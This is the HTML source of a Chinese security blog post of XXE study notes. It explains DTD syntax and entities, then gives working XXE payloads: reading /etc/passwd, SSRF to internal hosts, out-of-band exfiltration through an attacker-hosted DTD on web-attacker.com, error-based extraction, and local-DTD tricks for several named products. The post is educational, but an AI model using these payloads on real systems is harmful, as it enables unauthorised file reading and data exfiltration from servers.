@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>xxe学习笔记 | blog</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="xxe," />
+  
+
+  <meta name="description" content="0x01 DTD基础知识DTD全称document type definition，对xml的格式进行规范。DTD可以声明于xml文档中，也可以作为一个外部引用。 内部DTD声明： 基本语法： 1&lt;!DOCTYPE root-element [element-declarations]&gt;  1234567891011121314&lt;?xml version&#x3D;&quot;1.0&amp;qu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xxe学习笔记">
+<meta property="og:url" content="http://blog.le31ei.top/2021/03/09/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="0x01 DTD基础知识DTD全称document type definition，对xml的格式进行规范。DTD可以声明于xml文档中，也可以作为一个外部引用。 内部DTD声明： 基本语法： 1&lt;!DOCTYPE root-element [element-declarations]&gt;  1234567891011121314&lt;?xml version&#x3D;&quot;1.0&amp;qu">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.le31ei.top/2021/03/09/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20181120002647-e93bbf00-ec17-1.png">
+<meta property="article:published_time" content="2021-03-09T04:22:06.000Z">
+<meta property="article:modified_time" content="2021-03-09T04:22:06.710Z">
+<meta property="article:author" content="le31ei">
+<meta property="article:tag" content="xxe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.le31ei.top/2021/03/09/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20181120002647-e93bbf00-ec17-1.png">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
+
+
+  
+
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'G-4RKHRGTSTZ', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?ccc85f1c0e860658bc30a742eab6c9d0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+
+<meta name="generator" content="Hexo 5.0.2"><link rel="alternate" href="/atom.xml" title="blog" type="application/atom+xml">
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">HOME</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">HOME</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/atom.xml"
+            rel="noopener noreferrer"
+            target="_blank"
+            >
+            RSS
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            search
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-DTD%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">0x01 DTD基础知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-XXE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">0x02 XXE利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-text">1. 读文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-ssrf"><span class="toc-text">2. ssrf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-oob"><span class="toc-text">3. oob</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="toc-text">参考文档</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-xxe学习笔记" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">xxe学习笔记</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2021.03.09</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>le31ei</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/Pentest/">Pentest</a>
+  </span>
+
+
+
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h1 id="0x01-DTD基础知识"><a href="#0x01-DTD基础知识" class="headerlink" title="0x01 DTD基础知识"></a>0x01 DTD基础知识</h1><p><code>DTD</code>全称document type definition，对xml的格式进行规范。DTD可以声明于xml文档中，也可以作为一个外部引用。</p>
+<p><strong>内部DTD声明</strong>：</p>
+<p>基本语法：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root-element</span> [element-declarations]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [                          // 定义了note类型的文档，也就是根元素为note</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span>    // 定义了note有四个元素</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>                   // 定义to元素的类型</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>                 // 定义from元素的类型</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>              //定义heading元素的类型</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>                 //定义body元素的类型</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>外部DTD声明</strong></p>
+<p>基本语法：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root-element</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;filename&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>示例：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>note.dtd文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>PCDATA</strong></p>
+<p>被解析的字符数据，表示该元素的类型是字符串类型，但是特殊字符会被实体化编码，例如：<code>&amp;</code>、<code>&lt;</code>、<code>&gt;</code>会被替换为<code>&amp;amp;</code>、<code>&amp;lt</code>、<code>&amp;gt</code>、。</p>
+<p><strong>CDATA</strong></p>
+<p>不会被解释器解析的文本，所有的标签会原封不动的展示出来。</p>
+<p><strong>DTD实体</strong></p>
+<p>内部实体：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</span><br><span class="line">&lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;引用实体</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure>
+
+<p>外部实体：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http:&#x2F;&#x2F;xxx.com&#x2F;entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;xxx&#x2F;entities.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;引用实体</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>通用实体与参数实体</strong></p>
+<p>通用实体指的是直接引用的实体，用&amp;开头命名，参数实体指的是在DTD中定义的其他通用实体</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;&#x2F;firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;&#x2F;lastname&gt;  &#x2F;&#x2F; 通用实体，直接使用&amp;进行引用</span><br><span class="line">    ... </span><br><span class="line">&lt;&#x2F;updateProfile&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;xxx.com&#x2F;remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;    &#x2F;&#x2F;参数实体，引用参数来定义通用实体</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-XXE利用方式"><a href="#0x02-XXE利用方式" class="headerlink" title="0x02 XXE利用方式"></a>0x02 XXE利用方式</h1><h2 id="1-读文件"><a href="#1-读文件" class="headerlink" title="1. 读文件"></a>1. 读文件</h2><p>一般有回显的情况下可以直接读取文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">productId</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">productId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-ssrf"><a href="#2-ssrf" class="headerlink" title="2. ssrf"></a>2. ssrf</h2><p>无回显的时候，可以通过错误的返回来进行ssrf攻击</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://internal.vulnerable-website.com/&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>各种语言支持的协议如下图：</p>
+<p><img src="/2021/03/09/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20181120002647-e93bbf00-ec17-1.png" alt="img"></p>
+<h2 id="3-oob"><a href="#3-oob" class="headerlink" title="3. oob"></a>3. oob</h2><p><strong>数据带外</strong></p>
+<p>外部加载的DTD文件，作用是让程序读取/etc/passwd然后发送到外部服务器，引号中的%需要编码成<code>&amp;#x25</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;web-attacker.com&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate; </span><br></pre></td></tr></table></figure>
+
+<p>将以上文件放到受控的服务器：<code>http://web-attacker.com/malicious.dtd</code></p>
+<p>然后对目标发送如下payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM</span><br><span class="line">&quot;http:&#x2F;&#x2F;web-attacker.com&#x2F;malicious.dtd&quot;&gt; %xxe;]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>对于很多文件中存在换行符的情况，以上则无法进行处理。</p>
+<p>针对php可以采用伪协议进行base64编码发送</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;web-attacker.com&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate; </span><br></pre></td></tr></table></figure>
+
+<p><strong>如果碰到数据带不出来，但有报错的情况，可以使用如下payload，读取不存在的文件，通过报错来回显数据</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure>
+
+<p><strong>如果防火墙对加载外部dtd有防护的话，则可以采用<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind">https://portswigger.net/web-security/xxe/blind</a>这里所写的办法</strong></p>
+<p>加载一个本地的dtd文件，然后覆盖文件内的节点，通过报错来直接回显数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;app&#x2F;schema.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % custom_entity &#39;</span><br><span class="line">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">&amp;#x25;eval;</span><br><span class="line">&amp;#x25;error;</span><br><span class="line">&#39;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>里面的<code>custom_entity</code>实体需要包含在<code>schema.dtd</code>中</p>
+<p>针对不同的系统，可以有如下已经存在的dtd文件:</p>
+<p><strong>linux gnome桌面</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamsa &#39;Your DTD code&#39;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+
+<p><strong>windows</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\Windows\System32\wbem\xml\cim20.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % SuperClass &#39;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#39;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Cisco WebEx</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;scrollkeeper&#x2F;dtds&#x2F;scrollkeeper-omf.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % url.attribute.set &#39;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#39;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Citrix XenMobile Server</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;jar:file:&#x2F;&#x2F;&#x2F;opt&#x2F;sas&#x2F;sw&#x2F;tomcat&#x2F;shared&#x2F;lib&#x2F;jsp-api.jar!&#x2F;javax&#x2F;servlet&#x2F;jsp&#x2F;resources&#x2F;jspxml.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % Body &#39;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#39;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Custom Multi-Platform IBM WebSphere Application</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;.&#x2F;..&#x2F;..&#x2F;properties&#x2F;schemas&#x2F;j2ee&#x2F;XMLSchema.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xs-datatypes &#39;Your DTD code&#39;&gt;</span><br><span class="line">&lt;!ENTITY % simpleType &quot;a&quot;&gt;</span><br><span class="line">&lt;!ENTITY % restriction &quot;b&quot;&gt;</span><br><span class="line">&lt;!ENTITY % boolean &quot;(c)&quot;&gt;</span><br><span class="line">&lt;!ENTITY % URIref &quot;CDATA&quot;&gt;</span><br><span class="line">&lt;!ENTITY % XPathExpr &quot;CDATA&quot;&gt;</span><br><span class="line">&lt;!ENTITY % QName &quot;NMTOKEN&quot;&gt;</span><br><span class="line">&lt;!ENTITY % NCName &quot;NMTOKEN&quot;&gt;</span><br><span class="line">&lt;!ENTITY % nonNegativeInteger &quot;NMTOKEN&quot;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">XML external entity (XXE) injection</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind">Finding and exploiting blind XXE vulnerabilities</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4059">绕过WAF保护的XXE</a></li>
+<li><a target="_blank" rel="noopener" href="https://hundan.org/2019-11-13-%E4%BD%BF%E7%94%A8%E6%9C%AC%E5%9C%B0DTD%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB.html">使用本地DTD文件进行XXE攻击</a></li>
+</ol>
+
+    
+  </div>
+
+</article>
+
+
+   
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2021/03/04/amazon-S3-Bucket-takeover/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/atom.xml"
+              rel="noopener noreferrer"
+              target="_blank"
+              >
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              search
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+    <div id="comment" class="vcomment" ></div>
+    <script>
+        var notify = 'true' == true ? true : false;
+        var verify = 'false' == true ? true : false;
+        var GUEST_INFO = ['nick','mail','link'];
+        var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+            return GUEST_INFO.indexOf(item) > -1
+        });
+        guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+        window.valine = new Valine({
+            el: '.vcomment',
+            notify: notify,
+            verify: verify,
